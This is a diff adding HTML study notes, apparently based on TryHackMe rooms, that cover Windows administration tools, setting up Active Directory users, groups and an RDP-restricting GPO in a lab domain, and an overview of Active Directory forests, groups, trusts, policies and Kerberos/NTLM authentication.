+  <li>Event Viewer</li>
+  <li>Shared Folders</li>
+  <li>Local users &amp; computers</li>
+  <li>Performance Monitor</li>
+  <li>Disk Management</li>
+  <li>Services &amp; Applications<br><br>&nbsp;</li>
+</ul>
+<p>Task Scheduler - This is a tool&nbsp;that allows predefined actions to be automatically executed whenever a certain set of conditions is met(Ex: You can set up a date and time for a piece of software to be installed, or a script to run).</p>
+<p>Event Viewer - Probably one of the most important tools that come with Windows. The Event Viewer logs events that happen across the device (Ex: Successful &amp; Failed login attempts, System Errors, etc). The reason Event Viewer is important is because it can be used to forward the events to a SIEM (Security Information and Event Manager) which helps the IT team of a company determine possible malicious activities.</p>
+<p>Shared Folders - Is a directory or a folder that can be shared across the network and can be accessed by multiple users.</p>
+<p>Local users and computers - Using local users and computers we can create users, add them to different built-in groups, and they can be given different levels of access (Ex: User A can connect through RDP to a machine but user B can't).</p>
+<p>Performance Monitor -Performance Monitor monitors the different activities across the device such as CPU usage, memory usage, etc.</p>
+<p>Disk Management - Using Disk Management you can shrink, expand, create new partitions (drives) and format the partitions.</p>
+<p>Services &amp; Applications - It is possible to check the running services on the system and you have the ability to start, stop or restart them.<br><br>&nbsp;</p>
+<p><strong>Local Security Policy</strong></p>
+<p>Local Security Policy is a group of settings you can configure to strengthen the computer's security. Even though<br>most policy settings in Windows are fine, there are a few that need adjusting for enhanced security. You can set the minimum password length, the password complexity level, you can disable guest &amp; local administrator accounts, and many more.</p>
+<p>Note: If the computer is not integrated into an Active Directory environment disabling local administrator account is a bad idea.</p>
+<p>&nbsp;</p>
+<p><strong>Disk Cleanup</strong></p>
+<p>Another useful utility is Disk Cleanup. Using Disk Cleanup we can delete files that are no longer needed by the system and are just adding up to the computer disk space. Running Disk Cleanup as administrator we can also clean system files (Ex: sometimes, after getting updates some files remain on disk, but these are no longer needed).</p>
+<p>To access Disk Cleanup right-click on Local Disk C and click Properties. You should see a button in the General tab named "Disk Cleanup".</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image177.png"></figure>
+<p>You just need to tick the box/files you want to clean and press OK.</p>
+<p>&nbsp;</p>
+<p><strong>Registry Editor</strong></p>
+<p>The Windows registry database stores many important operating system settings. For example, it contains entries with information about what should happen when double-clicking a particular file type or how wide the taskbar should be. Built-in and inserted hardware also stores information in the registry when the driver is installed; this driver is called up every time the system is booted up.</p>
+<p>To access the Registry Editor you can either search it or use&nbsp;<strong>Windows Key + R&nbsp;</strong>and type&nbsp;<strong>RegEdit</strong>.</p>
+<p>&nbsp;</p>
+<p><strong>Command-line tools</strong></p>
+<p>Windows comes equipped with two command-line tools (and one can be installed):</p>
+<p>CMD</p>
+<p>Powershell</p>
+<p>Windows Terminal</p>
+<p><strong>CMD</strong>&nbsp;is the command-line interpreter for Microsoft Windows operating systems used to automate various system-related tasks using scripts and batch files. Users can interact with the&nbsp;OS&nbsp;directly using text-based commands. It emulates most of the command line abilities available in MS-DOS through a command-line interface.</p>
+<p>&nbsp;</p>
+<p><strong>Powershell</strong>&nbsp;is mainly used by sysadmins to manage the network and domain they handle, as well as the computers and other devices that are part of it. PowerShell is a scripting language. The PowerShell can interpret batch commands and Powershell commands, but the command prompt can only interpret batch commands.</p>
+<p>&nbsp;</p>
+<p>Both CMD and Powershell are powerful command-line tools used to automate system administration tasks by writing a script/batch file. However, CMD has limited administration capabilities as compared to Powershell, which, on the other hand, is a more advanced and modern shell implementation with additional features and enhancements (Ex: cmdlets).</p>
+<p>&nbsp;</p>
+<p><strong>Windows Terminal</strong>&nbsp;can be used instead of Powershell and CMD and can be installed from the Microsoft Store. The application includes multiple tab support, alongside themes and customization for developers who want to tweak the Terminal.</p>
+<p>&nbsp;</p>
+<p><strong>Registry Editor</strong></p>
+<p>&nbsp;</p>
+<p>Registry Editor can be considered a database that contains low-level settings for Microsoft Windows settings and applications. The registries are structured as follows:</p>
+<ul>
+  <li>HKEY_CLASSES_ROOT</li>
+  <li>HKEY_CURRENT_USER</li>
+  <li>HKEY_LOCAL_MACHINE</li>
+  <li>HKEY_USERS</li>
+  <li>HKEY_CURRENT_CONFIG</li>
+</ul>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image179.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>A feature of Powershell is that you can browse the registries. You can do that by typing: "<strong>cd &lt;REG DB&gt;</strong>" (Example:&nbsp;<strong>cd HKLM:\</strong>).</p>
+<p>Windows also has a builtin tool named "reg" which can be used from the command line to add, remove, query, import, export, etc registry keys.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image180.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>There is also available a GUI that can be used. You can search for "<strong>Regedit</strong>" or type it in the command line.</p>
+<p>There is no point to remember the paths for some settings that are located in the registry editor. You can look up for the settings on the internet.</p>
+<p>&nbsp;</p>
+<h2>Types of servers</h2>
+<p>A server is a piece of hardware or software equipment that provides functionality for other softwares or devices.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>Types of servers</p>
+<p>Servers can be used for a variety of actions or things. The most common ones are:</p>
+<p>Domain Controller</p>
+<p>File server</p>
+<p>Web server</p>
+<p>FTP&nbsp;Server</p>
+<p>Mail Server</p>
+<p>Database Server</p>
+<p>Proxy Server</p>
+<p>Application Server</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image182.png"></figure>
+<p>&nbsp;</p>
+<p><br><br>&nbsp;</p>
+<p><strong>Domain Controller&nbsp;</strong>- Might be one of the most important servers because in an AD or AAD infrastructure we can control users, groups, restrict actions, improve security, and many more of other computers and servers.<br><br>&nbsp;</p>
+<p><strong>File Server -&nbsp;</strong>File servers provide a great way to share files across devices on a network.<br><br>&nbsp;</p>
+<p><strong>Web Server-&nbsp;</strong>It serves static or dynamic content to a Web browser by loading a file from a disk and serving it across the network to a user’s Web browser.</p>
+<p><strong>FTP&nbsp;Server -&nbsp;</strong>Makes possible moving one or more files securely between computers while providing file security and organization as well as transfer control.</p>
+<p><strong>Mail Server -&nbsp;</strong>Mail servers move and store mail over corporate networks (via LANs and WANs) and across the Internet.</p>
+<p><strong>Database Server -&nbsp;</strong>A database server is a computer system that provides other computers with services related to accessing and retrieving data from one or multiple databases.</p>
+<p><strong>Proxy Server -&nbsp;</strong>This server usually sits between a client program and an external server to filter requests, improve performance, and share connections.</p>
+<p><strong>Application Server -&nbsp;</strong>They're usually used to connect the database servers and the users.</p>
+<p>&nbsp;</p>
+<h2>User and group management</h2>
+<p>In Active Directory user management is done using the&nbsp;Active Directory Users and Computers.&nbsp;To access it go to&nbsp;Tools &gt;&nbsp;Active Directory Users and Computers.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image184.png"></figure>
+<p>Before any other action let's enable&nbsp;Advanced Features&nbsp;which adds additional features when looking at an object properties.&nbsp;That is doable by going to&nbsp;View &gt; Advanced Features.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image186.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>By double-clicking on&nbsp;thm.lab&nbsp;we are presented with the Active Directory tree.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image188.png"></figure>
+<p>Let's create an Organizational Unit (OU) where to store the users. To do that right-click on the domain name (thm.lab) and go to&nbsp;New &gt; Organizational Unit. I named it LAB and clicked OK to create it.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image190.png"></figure>
+<p>Let's create two more OUs inside the newly created OU (it will look nested). In one OU we'll store users and in the second one, we'll store Groups. To create the OU's we can repeat the steps above (Right-click on LAB OU &gt; New &gt; Organizational Unit).</p>
+<p>Time to create some users and groups! To do so right-click on the Users OU and go to&nbsp;New &gt; User&nbsp;and fill in the information required.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image192.png"></figure>
+<p>Click&nbsp;Next&nbsp;and set a password for the user.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image194.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>The reason I checked only "Password never expires" is because I do not want the password to expire after a period of time (the default period of time in AD is 42 days). In a production environment, you would probably check "User must change password at next logon" so the user can set a password he desires after you created his AD account.</p>
+<p>Since the password can be set to expire after a period of time it would be a bad idea to check the "User cannot change password" because he won't be able to reset the password and you will have to manually intervene.</p>
+<p>As for the last box "Disable account" it's obvious the action that will take place. It will disable the user account. You might want to disable a user account in case he has a leave (let's say 6 months leave) and you do not want him or any other colleague or malicious entity to use his account.</p>
+<p>Click on&nbsp;Next&nbsp;and you will be shown the account information and click&nbsp;Finish&nbsp;to finish the account creation.</p>
+<p>Note: The username that is going to be used by the user in order to authenticate is the one you set in the&nbsp;User Logon Name.</p>
+<p>You've successfully created your first AD user. Now, create two more users and name them as you wish.</p>
+<p>We should have three users in the AD:</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image196.png" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>&nbsp;</p>
+<p>Let's move to the Groups OU. Right click on the&nbsp;OU &gt; New &gt; Group.</p>
+<p>I named the group&nbsp;Admins&nbsp;and clicked OK to create it.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image198.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Then I created another group named&nbsp;RDP Access.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image200.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>And finally using the same method create one more group named&nbsp;No RDP Access.</p>
+<p>We should have the following groups in AD:</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image202.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>&nbsp;</p>
+<p>To assign a user to a group you can do that in two ways:</p>
+<p>Right-clicking a user &gt; Add to a group</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image204.png"></figure>
+<p>&nbsp; 2.&nbsp;Double-clicking a group &gt;&nbsp;click on&nbsp;Members&nbsp;tab&nbsp;&gt; Add</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image206.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><br>Using the first method let's add Albert Einstein to the Admins group. A window will be prompted to search for an object in the AD. You can type in the&nbsp;Enter object name to select&nbsp;field the name of the group created (in my case Admins), click&nbsp;Check Names, and&nbsp;OK&nbsp;to add the user to the specified group.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image208.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Proceed to add one of the created users to the&nbsp;RDP Access&nbsp;group and the other to the&nbsp;No RDP Access&nbsp;group.</p>
+<p>Another thing to keep in mind is that an object can be a member of another object (Ex: A group can be a member of another group).</p>
+<p>We added Albert Einstein to a group named&nbsp;Admins. Let's add the&nbsp;Admins&nbsp;group to the&nbsp;Domain Admins&nbsp;group. To do that we can&nbsp;right-click on Admins group &gt; Add to a group and search for Domain Admins&nbsp;and press OK.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image210.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>As we've done with Albert Einstein's account, add both&nbsp;RDP Access&nbsp;and&nbsp;No RDP Access&nbsp;groups to the&nbsp;Remote Desktop Users&nbsp;group</p>
+<p>Note: Even though adding the&nbsp;No RDP Access&nbsp;group to the&nbsp;RDP Users&nbsp;group the&nbsp;No RDP Access&nbsp;group can be blocked using GPO. This will be done in the next task (Creating your first GPO).</p>
+<p>&nbsp;</p>
+<h2>Creating a GPO</h2>
+<p>A GPO or a Group Policy Object is a feature of Active Directory that adds additional controls to user accounts and computers.</p>
+<p>Group Policy settings including local settings, site-wide settings, domain-level settings and settings applied to organizational units.</p>
+<p>&nbsp;</p>
+<p>To create a GPO we need to go to&nbsp;<strong>Tools &gt; Group Policy Management</strong>&nbsp;inside the Server Manager.<br><br>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image212.png"></figure>
+<p>Right-click on "<strong>Group Policy Objects</strong>" and create a new object. I will name mine "<strong>Groups GPO</strong>".<br>To edit the GPO&nbsp;<strong>right-click on it &gt; Edit</strong>.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image214.png"></figure>
+<p>For the purpose of this demo, we will set different permissions for the groups recently created.</p>
+<p>First, let's let users authenticate using RDP. To do so, go to&nbsp;<strong>Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Users Right Assignment&nbsp;</strong>and double click on&nbsp;<strong>Allow log on through Remote Desktop Services</strong>.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image216.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Select&nbsp;<strong>Define these policy settings</strong>&nbsp;<strong>&gt; Add user or group &gt; Browse</strong></p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image218.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Search for&nbsp;<strong>Admins&nbsp;</strong>and&nbsp;<strong>RDP Access</strong>&nbsp;groups and click OK &gt; OK to add them.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image220.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>&nbsp;</p>
+<p>To block a user or a group to login using RDP we can do that by double-clicking&nbsp;<strong>Deny log on through Remote Desktop Services</strong>&nbsp;and adding&nbsp;<strong>No RDP Access</strong>&nbsp;group in there.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image222.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>We can close the editor and go back to our Group Policy Management console/tab/panel. In order to make the policy apply, we have to link the GPO to the root of the domain (thm.lab). To do that&nbsp;<strong>right-click on Domain Controllers OU &gt; Link an existing GPO and select the GPO you created</strong>&nbsp;(Groups GPO in my case) and press OK.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image224.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>To apply the GPO open a CMD as an administrator (right-click on it &gt; Run as administrator) and type the following:&nbsp;<strong>gpupdate /force&nbsp;</strong>and wait for the policy to apply.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image226.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>&nbsp;</p>
+<p>﻿Testing the GPO</p>
+<p>Let's try to RDP into the machine using each user and see the different level of access each has.</p>
+<p>The first user I'm going to login is Albert Einstein which has Domain Admin rights. The logon is successful. Open a CMD as admin and type "<strong>whoami</strong>".</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image228.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>As noticed we were able to start an elevated CMD.</p>
+<p>&nbsp;</p>
+<p>Sign out and log in using the account added to&nbsp;<strong>RDP Access</strong>&nbsp;group (In my case Jim Carrey).</p>
+<p>Try prompting an elevated CMD (<strong>Right-click on CMD &gt; Run as administrator</strong>). You notice that&nbsp;UAC&nbsp;(User Account Control) asks for admin credentials. If you try entering the credentials (username and password) of the account you are currently logged in you will notice the CMD prompt will not pop out. This happens because you are a simple user on the machine, not an administrator.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image230.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Note: You can spawn the shell if you use an administrator credential (in my case Albert Einstein).</p>
+<p>&nbsp;</p>
+<p>Lastly, try logging in with the account added to the&nbsp;<strong>No RDP Access</strong>.&nbsp;You will get the following error:</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image232.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>This happens because even though the&nbsp;<strong>No RDP Access</strong>&nbsp;group has been added to the&nbsp;<strong>Remote Desktop Users</strong>&nbsp;group using the GPO earlier created he have blocked RDP access to the users that are in that group.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h1>Active Directory basics</h1>
+<p>﻿Active Directory is the directory service for Windows Domain Networks. It is used by many of today's top companies and is a vital skill to comprehend when attacking Windows.</p>
+<p>It is recommended to have knowledge of basic network services, Windows, networking, and Powershell.</p>
+<p>The detail of specific uses and objects will be limited as this is only a general overview of Active Directory. For more information on a specific topic look for the corresponding room or do your own research on the topic.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image234.png"></figure>
+<p><a href="https://dribbble.com/shots/7137875-Caylent-Isometric-Illustration"><i>Caylent Isometric Illustration by Felix Oppenheimer on Dribble</i></a></p>
+<p>What is Active Directory? -&nbsp;</p>
+<p>Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, that make up the Active Directory network. Active Directory contains many functioning bits and pieces, a majority of which we will be covering in the upcoming tasks. To outline what we'll be covering take a look over this list of Active Directory components and become familiar with the various pieces of Active Directory:&nbsp;</p>
+<ul>
+  <li>Domain Controllers</li>
+  <li>Forests, Trees, Domains</li>
+  <li>Users + Groups&nbsp;</li>
+  <li>Trusts</li>
+  <li>Policies&nbsp;</li>
+  <li>Domain Services</li>
+</ul>
+<p>All of these parts of Active Directory come together to make a big network of machines and servers. Now that we know what Active Directory is let's talk about the why?</p>
+<p>Why use Active Directory? -</p>
+<p>The majority of large companies use Active Directory because it allows for the control and monitoring of their user's computers through a single domain controller. It allows a single user to sign in to any computer on the active directory network and have access to his or her stored files and folders in the server, as well as the local storage on that machine. This allows for any user in the company to use any machine that the company owns, without having to set up multiple users on a machine. Active Directory does it all for you.</p>
+<p>Now that we know the what and the why of Active Directory let's move on to how it works and functions.</p>
+<p>&nbsp;</p>
+<h2>Physical Active Directory</h2>
+<p>The physical Active Directory is the servers and machines on-premise, these can be anything from domain controllers and storage servers to domain user machines; everything needed for an Active Directory environment besides the software.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image236.png" alt="Afbeelding met tekst, computer
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><br><br>&nbsp;</p>
+<p><a href="https://image.shutterstock.com/image-vector/vector-set-various-cartoon-server-600w-1047593752.jpg"><i>Image Credit</i></a></p>
+<p>Domain Controllers -</p>
+<p>﻿A domain controller is a Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest. Domain controllers are the center of Active Directory&nbsp;--&nbsp;they control the rest of the domain. I will outline the tasks of a domain controller below:&nbsp;</p>
+<p>holds the AD DS data store&nbsp;</p>
+<p>handles authentication and authorization services&nbsp;</p>
+<p>replicate updates from other domain controllers in the forest</p>
+<p>Allows admin access to manage domain resources</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image238.png"></figure>
+<p><a href="https://image.shutterstock.com/image-vector/icon-depicting-different-networks-attached-600w-1130107907.jpg"><i>Image Credit</i></a></p>
+<p>AD DS Data Store -&nbsp;</p>
+<p>The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:</p>
+<p>Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users</p>
+<p>Stored by default in %SystemRoot%\NTDS</p>
+<p>accessible only by the domain controller</p>
+<p>That is everything that you need to know in terms of physical and on-premise Active Directory. Now move on to learn about the software and infrastructure behind the network.</p>
+<p>&nbsp;</p>
+<h2>The forest</h2>
+<p>The forest is what defines everything; it is the container that holds all of the other bits and pieces of the network together -- without the forest all of the other trees and domains would not be able to interact. The one thing to note when thinking of the forest is to not think of it too literally -- it is a physical thing just as much as it is a figurative thing. When we say "forest", it is only a way of describing the connection created between these trees and domains by the network.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image240.png"></figure>
+<p>﻿Forest Overview&nbsp;-</p>
+<p>﻿﻿A forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole.</p>
+<p>The Forest consists of these parts which we will go into farther detail with later:</p>
+<ul>
+  <li>Trees - A hierarchy of domains in Active Directory Domain Services</li>
+  <li>Domains - Used to group and manage objects&nbsp;</li>
+  <li>Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs</li>
+  <li>Trusts - Allows users to access resources in other domains</li>
+  <li>Objects - users, groups, printers, computers, shares</li>
+  <li>Domain Services -&nbsp;DNS&nbsp;Server, LLMNR, IPv6</li>
+  <li>Domain Schema - Rules for object creation</li>
+</ul>
+<p>&nbsp;</p>
+<h2>Users and Groups</h2>
+<p>The users and groups that are inside of an Active Directory are up to you; when you create a domain controller it comes with default groups and two default users: Administrator and guest. It is up to you to create new users and create new groups to add users to.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image242.png"></figure>
+<p><br><a href="https://pixabay.com/users/raphaelsilva-4702998"><i>Image by&nbsp;raphaelsilva&nbsp;from&nbsp;Pixabay</i></a></p>
+<p>Users Overview -&nbsp;</p>
+<p>﻿Users are the core to Active Directory; without users why have Active Directory in the first place? There are four main types of users you'll find in an Active Directory network; however, there can be more depending on how a company manages the permissions of its users.&nbsp;The four types of users are:&nbsp;</p>
+<ul>
+  <li>Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.</li>
+  <li>Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service&nbsp;with a service account</li>
+  <li>Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller</li>
+  <li>Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.</li>
+</ul>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image244.png"></figure>
+<p><a href="https://pixabay.com/users/raphaelsilva-4702998"><i>Image by&nbsp;raphaelsilva&nbsp;from&nbsp;Pixabay</i></a></p>
+<p>Groups Overview -&nbsp;</p>
+<p>﻿Groups make it easier to give permissions to users and objects by organizing them into groups with specified permissions.&nbsp;There are two overarching types of Active Directory groups:&nbsp;</p>
+<ul>
+  <li>Security Groups - These groups are used to specify permissions for a large number of users</li>
+  <li>Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration</li>
+</ul>
+<p>Default Security Groups -&nbsp;</p>
+<p>﻿There are a lot of default security groups so I won't be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups:</p>
+<ul>
+  <li>Domain Controllers - All domain controllers in the domain</li>
+  <li>Domain Guests -&nbsp;All domain guests</li>
+  <li>Domain Users -&nbsp;All domain users</li>
+  <li>Domain Computers -&nbsp;All workstations and servers joined to the domain</li>
+  <li>Domain Admins -&nbsp;Designated administrators of the domain</li>
+  <li>Enterprise Admins -&nbsp;Designated administrators of the enterprise</li>
+  <li>Schema Admins -&nbsp;Designated administrators of the schema</li>
+  <li>DNS&nbsp;Admins -&nbsp;DNS Administrators Group</li>
+  <li>DNS&nbsp;Update Proxy -&nbsp;DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).</li>
+  <li>Allowed RODC Password Replication Group -&nbsp;Members in this group can have their passwords replicated to all read-only domain controllers in the domain</li>
+  <li>Group Policy Creator Owners -&nbsp;Members in this group can modify group policy for the domain</li>
+  <li>Denied RODC Password Replication Group -&nbsp;Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain</li>
+  <li>Protected Users -&nbsp;Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.</li>
+  <li>Cert Publishers -&nbsp;Members of this group are permitted to publish certificates to the directory</li>
+  <li>Read-Only Domain Controllers -&nbsp;Members of this group are Read-Only Domain Controllers in the domain</li>
+  <li>Enterprise Read-Only Domain Controllers -&nbsp;Members of this group are Read-Only Domain Controllers in the enterprise</li>
+  <li>Key Admins -&nbsp;Members of this group can perform administrative actions on key objects within the domain.</li>
+  <li>Enterprise Key Admins -&nbsp;Members of this group can perform administrative actions on key objects within the forest.</li>
+  <li>Cloneable Domain Controllers -&nbsp;Members of this group that are domain controllers may be cloned.</li>
+  <li>RAS and IAS Servers -&nbsp;Servers in this group can access remote access properties of users</li>
+</ul>
+<p>&nbsp;</p>
+<h2>Trust and policies</h2>
+<p>Trusts and policies go hand in hand to help the domain and trees communicate with each other and maintain "security" inside of the network. They put the rules in place of how the domains inside of a forest can interact with each other, how an external forest can interact with the forest, and the overall domain rules or policies that a domain must follow.</p>
+<p>Domain Trusts Overview -</p>
+<p>﻿Trusts are a mechanism in place for users in the network to gain access to other resources in the domain. For the most part, trusts outline the way that the domains inside of a forest communicate to each other, in some environments trusts can be extended out to external domains and even forests in some cases.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image246.png"></figure>
+<p>There are two types of trusts that determine how the domains communicate. I'll outline the two types of trusts below:&nbsp;</p>
+<p>Directional - The direction of the trust flows from a trusting domain to a trusted domain</p>
+<p>Transitive - The trust relationship expands beyond just two domains to include other trusted domains</p>
+<p>The type of trusts put in place determines how the domains and trees in a forest are able to communicate and send data to and from each other when attacking an Active Directory environment you can sometimes abuse these trusts in order to move laterally throughout the network.&nbsp;</p>
+<p>Domain Policies Overview -&nbsp;</p>
+<p>Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active&nbsp; Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender. The options for domain policies are almost endless and are a big factor for attackers when enumerating an Active Directory network. I'll outline just a few of the&nbsp; many policies that are default or you can create in an Active Directory environment:&nbsp;</p>
+<p>Disable Windows Defender - Disables windows defender across all machine on the domain</p>
+<p>Digitally Sign Communication (Always) - Can disable or enable SMB signing on the domain controller</p>
+<p>&nbsp;</p>
+<h2>Active Directory Services and Authentication</h2>
+<p>The Active Directory domain services are the core functions of an Active Directory network; they allow for management of the domain, security certificates, LDAPs, and much more. This is how the domain controller decides what it wants to do and what services it wants to provide for the domain.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image248.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><a href="https://dribbble.com/shots/4887261-Tools"><i>Tools by Ana Miminoshvili on Dribble</i></a></p>
+<p>Domain Services Overview -&nbsp;</p>
+<p>Domain Services are exactly what they sound like. They are services that the domain controller provides to the rest of the domain or tree. There is a wide range of various services that can be added to a domain controller; however, in this room we'll only be going over the default services that come when you set up a Windows server as a domain controller. Outlined below are the default domain services:&nbsp;</p>
+<p>LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services</p>
+<p>Certificate Services - allows the domain controller to create, validate, and revoke public key certificates</p>
+<p>DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames</p>
+<p>Domain Authentication Overview -&nbsp;</p>
+<p>The most important part of Active Directory -- as well as the most vulnerable part of Active Directory -- is the authentication protocols set in place. There are two main types of authentication in place for Active Directory: NTLM and Kerberos. Since these will be covered in more depth in later rooms we will not be covering past the very basics needed to understand how they apply to Active Directory as a whole. For more information on NTLM and Kerberos check out the Attacking Kerberos room -&nbsp;<a href="https://tryhackme.com/room/attackingkerberos">https://tryhackme.com/room/attackingkerberos</a>.</p>
+<p>Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.</p>
+<p>NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol</p>
+<p>The Active Directory domain services are the main access point for attackers and contain some of the most vulnerable protocols for Active Directory, this will not be the last time you see them mentioned in terms of Active Directory security.</p>
+<p>&nbsp;</p>
+<h2>Active Directory in the Cloud</h2>
